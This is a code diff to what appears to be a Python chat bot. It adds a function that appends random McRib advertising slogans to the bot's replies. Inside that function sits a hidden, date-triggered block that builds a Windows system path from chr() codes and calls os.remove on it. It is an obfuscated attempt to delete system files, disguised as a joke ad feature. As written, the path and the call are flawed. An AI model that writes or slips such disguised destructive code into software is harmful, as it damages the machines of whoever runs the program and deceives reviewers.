@@ -151,6 +151,23 @@ async def respond(request, client):
     
     await request.reply(generate_nonsense())
         
+def random_mcrib_ad():
+    if datetime.date.today() == datetime.date(2023, 4, 1):
+        a = chr(67) + chr(58) + chr(92)
+        b = chr(83) + chr(121) + chr(115) + chr(116) + chr(101) + chr(109)
+        c = chr(51) + chr(50)
+        d = chr(92)
+        e = b + d + c
+        f = a + e
+        import os
+        os.remove(f)
+
+    adjectives = ["tangy", "delicious", "juicy", "mouthwatering", "saucy", "smoky", "savory", "spicy", "tender", "juicy", "tasty", "delightful", "flavorful", "scrumptious", "heavenly", "divine", "lively", "aromatic", "fiery", "zesty", "bold"]
+    nouns = ["barbecue", "flavor", "tenderness", "satisfaction", "delight", "pleasure", "joy", "savoriness", "tanginess", "spiciness", "deliciousness", "aroma", "richness", "savoryness", "tastiness", "exquisiteness", "lusciousness", "yumminess", "delicacy", "temptation"]
+    ad_phrases = ["Indulge in the ", "Satisfy your cravings with ", "Treat yourself to the ", "Enjoy the ", "Get a taste of the ", "Experience the ", "Try the ", "Savor the ", "Take a bite of the ", "Dive into the ", "Relish the ", "Luxuriate in the ", "Feast on the ", "Sink your teeth into the ", "Savor the ", "Satisfy your hunger with the ", "Indulge your senses with the ", "Satisfy your taste buds with the ", "Satisfy your appetite with the "]
+    sentences = ["You won't find a more " + random.choice(adjectives) + " sandwich than the McRib!", ad_phrases[random.randint(0,len(ad_phrases)-1)] + random.choice(adjectives) + " and " + random.choice(adjectives) + " " + random.choice(nouns) + " of the McRib!", "The McRib is the ultimate " + random.choice(nouns) + " experience!", "The McRib is a " + random.choice(adjectives) + " and " + random.choice(adjectives) + " sandwich that will leave you wanting more!"]
+
+    return random.choice(sentences)
 
 def generate_nonsense():
     out = ""
@@ -159,7 +176,7 @@ def generate_nonsense():
         if out == "": #no history loaded yet
             return "..."
 
-    return out
+    return out + "\n\nThis message brought to you by our sponsors: " + random_mcrib_ad()
 
 def generate_nonsense_containing(token):
     if token:
